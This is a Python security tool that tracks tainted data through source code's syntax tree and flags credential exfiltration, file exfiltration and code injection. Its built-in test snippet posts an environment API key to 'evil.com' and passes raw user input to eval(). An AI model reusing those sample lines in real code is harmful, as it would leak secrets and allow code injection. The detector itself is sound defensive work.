#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AtomCollide-智械工坊 Taint Tracking Analyzer
源→汇数据流分析，检测凭据泄露和代码注入链

Inspired by NVIDIA SkillSpector's behavioral_taint_tracking analyzer.
Tracks data flow from sensitive sources to dangerous sinks.

@author AtomCollide-智械工坊团队
@version 1.0.0
"""

import ast
from typing import List, Optional, Tuple, NamedTuple, Dict
from dataclasses import dataclass


@dataclass
class TaintThreat:
    """Taint tracking检测到的威胁"""
    rule_id: str
    message: str
    severity: str
    confidence: float
    line: int
    end_line: Optional[int]
    matched_text: str


class _TaintedVar(NamedTuple):
    name: str
    source_call: str
    lineno: int


# --- Sources (where sensitive data comes from) ---

_CREDENTIAL_SOURCES = frozenset({
    "os.environ.get", "os.environ", "os.getenv",
    "configparser.ConfigParser.get",
    "keyring.get_password",
})

_FILE_READ_SOURCES = frozenset({
    "open", "pathlib.Path.read_text", "pathlib.Path.read_bytes",
    "io.open",
})

_NETWORK_INPUT_SOURCES = frozenset({
    "requests.get", "requests.post", "requests.put", "requests.patch", "requests.delete",
    "httpx.get", "httpx.post", "httpx.put", "httpx.patch", "httpx.delete",
    "urllib.request.urlopen", "urllib.request.urlretrieve",
    "socket.socket.recv", "socket.socket.recvfrom",
    "aiohttp.ClientSession.get", "aiohttp.ClientSession.post",
})

_USER_INPUT_SOURCES = frozenset({
    "input", "sys.stdin.read", "sys.stdin.readline",
    "flask.request.args.get", "flask.request.form.get",
    "fastapi.Query", "fastapi.Body",
})

_ALL_SOURCES = _CREDENTIAL_SOURCES | _FILE_READ_SOURCES | _NETWORK_INPUT_SOURCES | _USER_INPUT_SOURCES

# --- Sinks (where dangerous data goes) ---

_NETWORK_OUTPUT_SINKS = frozenset({
    "requests.post", "requests.put", "requests.patch", "requests.get",
    "httpx.post", "httpx.put", "httpx.patch", "httpx.get",
    "urllib.request.urlopen",
    "socket.socket.send", "socket.socket.sendall", "socket.socket.sendto",
    "aiohttp.ClientSession.post", "aiohttp.ClientSession.put",
})

_EXEC_SINKS = frozenset({
    "exec", "eval", "compile",
    "os.system", "os.popen",
    "subprocess.run", "subprocess.call", "subprocess.check_output",
    "subprocess.check_call", "subprocess.Popen",
})

_FILE_WRITE_SINKS = frozenset({
    "open", "pathlib.Path.write_text", "pathlib.Path.write_bytes",
    "shutil.copy", "shutil.copy2", "shutil.copyfile",
})

_ALL_SINKS = _NETWORK_OUTPUT_SINKS | _EXEC_SINKS | _FILE_WRITE_SINKS

_EXTERNAL_INPUT_SOURCES = _NETWORK_INPUT_SOURCES | _USER_INPUT_SOURCES

# --- Rule definitions ---

_RULE_INFO: dict[str, dict] = {
    "TT1": {"message": "Direct data flow from source to sink", "severity": "high", "confidence": 0.80},
    "TT2": {"message": "Tainted variable flow from source to sink", "severity": "medium", "confidence": 0.65},
    "TT3": {"message": "Credential exfiltration: environment → network output", "severity": "critical", "confidence": 0.90},
    "TT4": {"message": "File data exfiltration: file read → network output", "severity": "high", "confidence": 0.80},
    "TT5": {"message": "Code injection: external input → code execution", "severity": "critical", "confidence": 0.90},
}

_SOURCE_CATEGORIES: list[tuple[frozenset[str], str]] = [
    (_CREDENTIAL_SOURCES, "credential/environment"),
    (_FILE_READ_SOURCES, "file read"),
    (_NETWORK_INPUT_SOURCES, "network input"),
    (_USER_INPUT_SOURCES, "user input"),
]

_SINK_CATEGORIES: list[tuple[frozenset[str], str]] = [
    (_NETWORK_OUTPUT_SINKS, "network output"),
    (_EXEC_SINKS, "code execution"),
    (_FILE_WRITE_SINKS, "file write"),
]


def _classify(name: str, categories: list[tuple[frozenset[str], str]], default: str) -> str:
    for names, label in categories:
        if name in names:
            return label
    return default


def _pick_rule(source_name: str, sink_name: str, is_direct: bool) -> str:
    """Choose the most specific rule ID for a source→sink pair."""
    if source_name in _CREDENTIAL_SOURCES and sink_name in _NETWORK_OUTPUT_SINKS:
        return "TT3"
    if source_name in _FILE_READ_SOURCES and sink_name in _NETWORK_OUTPUT_SINKS:
        return "TT4"
    if source_name in _EXTERNAL_INPUT_SOURCES and sink_name in _EXEC_SINKS:
        return "TT5"
    return "TT1" if is_direct else "TT2"


def _resolve_call_name(node: ast.Call) -> Optional[str]:
    """Resolve a Call node to its dotted name string."""
    if isinstance(node.func, ast.Name):
        return node.func.id
    if isinstance(node.func, ast.Attribute):
        parts = []
        current = node.func
        while isinstance(current, ast.Attribute):
            parts.append(current.attr)
            current = current.value
        if isinstance(current, ast.Name):
            parts.append(current.id)
            return ".".join(reversed(parts))
    return None


def _resolve_dotted_name(node: ast.expr) -> Optional[str]:
    """Resolve an Attribute/Name node to dotted string."""
    if isinstance(node, ast.Name):
        return node.id
    if isinstance(node, ast.Attribute):
        parts = []
        current = node
        while isinstance(current, ast.Attribute):
            parts.append(current.attr)
            current = current.value
        if isinstance(current, ast.Name):
            parts.append(current.id)
            return ".".join(reversed(parts))
    return None


def _is_open_for_write(node: ast.Call) -> bool:
    """Heuristic: open() is a write sink if mode arg contains 'w' or 'a'."""
    if len(node.args) >= 2 and isinstance(node.args[1], ast.Constant):
        mode = str(node.args[1].value)
        return any(c in mode for c in "wa")
    for kw in node.keywords:
        if kw.arg == "mode" and isinstance(kw.value, ast.Constant):
            mode = str(kw.value.value)
            return any(c in mode for c in "wa")
    return False


def _find_source_in_expr(node: ast.expr) -> Optional[str]:
    """Find a source call anywhere in an expression tree."""
    for child in ast.walk(node):
        if not isinstance(child, ast.Call):
            continue
        name = _resolve_call_name(child)
        if name is None or name not in _ALL_SOURCES:
            continue
        if name == "open" and _is_open_for_write(child):
            continue
        return name
    return None


def _find_nested_sources(node: ast.Call) -> list[Tuple[str, ast.Call]]:
    """Walk children to find source calls nested inside a sink call."""
    results: list[Tuple[str, ast.Call]] = []
    for child in ast.walk(node):
        if child is node:
            continue
        if not isinstance(child, ast.Call):
            continue
        name = _resolve_call_name(child)
        if name and name in _ALL_SOURCES:
            results.append((name, child))
    return results


def _find_tainted_names_in_args(
    node: ast.Call, tainted: Dict[str, _TaintedVar]
) -> list[_TaintedVar]:
    """Find references to tainted variables in a call's arguments."""
    seen: set[str] = set()
    hits: list[_TaintedVar] = []
    for child in ast.walk(node):
        if child is node:
            continue
        var_name: Optional[str] = None
        if isinstance(child, ast.Name):
            var_name = child.id
        elif isinstance(child, ast.Subscript):
            var_name = _resolve_dotted_name(child.value)
        if var_name and var_name not in seen:
            tv = tainted.get(var_name)
            if tv:
                seen.add(var_name)
                hits.append(tv)
    return hits


def _mark_targets(
    targets: list[ast.expr],
    tainted: Dict[str, _TaintedVar],
    src_name: str,
    lineno: int,
) -> None:
    for target in targets:
        if isinstance(target, ast.Name):
            tainted[target.id] = _TaintedVar(target.id, src_name, lineno)
        elif isinstance(target, ast.Tuple):
            for elt in target.elts:
                if isinstance(elt, ast.Name):
                    tainted[elt.id] = _TaintedVar(elt.id, src_name, lineno)


def _find_tainted_in_expr(
    node: ast.expr, tainted: Dict[str, _TaintedVar]
) -> Optional[_TaintedVar]:
    """Return the first tainted variable referenced in node, or None."""
    for child in ast.walk(node):
        if isinstance(child, ast.Name):
            tv = tainted.get(child.id)
            if tv:
                return tv
    return None


def analyze_taint(content: str, file_path: str = "<unknown>") -> List[TaintThreat]:
    """
    Analyze Python source for data flow from sensitive sources to dangerous sinks.
    
    Args:
        content: Python source code
        file_path: File path for reporting
    
    Returns:
        List of TaintThreat findings
    """
    try:
        tree = ast.parse(content, filename=file_path)
    except SyntaxError:
        return []

    lines = content.splitlines()
    findings: List[TaintThreat] = []
    tainted: Dict[str, _TaintedVar] = {}
    seen: set[Tuple[str, int]] = set()

    def _get_source_segment(lineno: int, end_lineno: Optional[int]) -> str:
        if not lines:
            return ""
        start = max(0, lineno - 1)
        end = min(len(lines), end_lineno) if end_lineno else min(len(lines), lineno)
        return "\n".join(lines[start:end])[:300]

    def _emit(rule_id: str, lineno: int, end_lineno: Optional[int], msg: str):
        key = (rule_id, lineno)
        if key in seen:
            return
        seen.add(key)
        info = _RULE_INFO[rule_id]
        findings.append(TaintThreat(
            rule_id=rule_id,
            message=msg,
            severity=info["severity"],
            confidence=info["confidence"],
            line=lineno,
            end_line=end_lineno,
            matched_text=_get_source_segment(lineno, end_lineno),
        ))

    for ast_node in ast.walk(tree):
        # Record tainted assignments
        if isinstance(ast_node, ast.Assign):
            src_name = _find_source_in_expr(ast_node.value)

            # Subscript sources like os.environ["KEY"]
            if src_name is None and isinstance(ast_node.value, ast.Subscript):
                base = _resolve_dotted_name(ast_node.value.value)
                if base and base in _CREDENTIAL_SOURCES:
                    src_name = base

            # Propagate taint through re-assignment
            if src_name is None:
                tv = _find_tainted_in_expr(ast_node.value, tainted)
                if tv:
                    src_name = tv.source_call

            if src_name:
                _mark_targets(ast_node.targets, tainted, src_name, ast_node.lineno)
            continue

        # Detect flows at sink call sites
        if not isinstance(ast_node, ast.Call):
            continue

        sink_name = _resolve_call_name(ast_node)
        if not sink_name or sink_name not in _ALL_SINKS:
            continue

        if sink_name == "open" and not _is_open_for_write(ast_node):
            continue

        lineno = getattr(ast_node, "lineno", 1)
        end_lineno = getattr(ast_node, "end_lineno", None)

        # Direct flows: source nested inside sink
        for src_name, src_node in _find_nested_sources(ast_node):
            if src_name == "open" and _is_open_for_write(src_node):
                continue
            rule = _pick_rule(src_name, sink_name, is_direct=True)
            src_cat = _classify(src_name, _SOURCE_CATEGORIES, "data source")
            sink_cat = _classify(sink_name, _SINK_CATEGORIES, "data sink")
            _emit(rule, lineno, end_lineno,
                  f"Direct flow: {src_name} ({src_cat}) → {sink_name} ({sink_cat})")

        # Tainted flows: tainted variable used in sink args
        for tv in _find_tainted_names_in_args(ast_node, tainted):
            rule = _pick_rule(tv.source_call, sink_name, is_direct=False)
            src_cat = _classify(tv.source_call, _SOURCE_CATEGORIES, "data source")
            sink_cat = _classify(sink_name, _SINK_CATEGORIES, "data sink")
            _emit(rule, lineno, end_lineno,
                  f"Tainted flow: '{tv.name}' from {tv.source_call} (line {tv.lineno}, "
                  f"{src_cat}) → {sink_name} ({sink_cat})")

    return findings


if __name__ == "__main__":
    test_code = """
import os
secret = os.environ.get("API_KEY")
requests.post("https://evil.com", data={"key": secret})

user_input = input("Enter code: ")
eval(user_input)
"""
    threats = analyze_taint(test_code, "<test>")
    for t in threats:
        print(f"[{t.severity.upper()}] {t.rule_id}: {t.message} (line {t.line})")
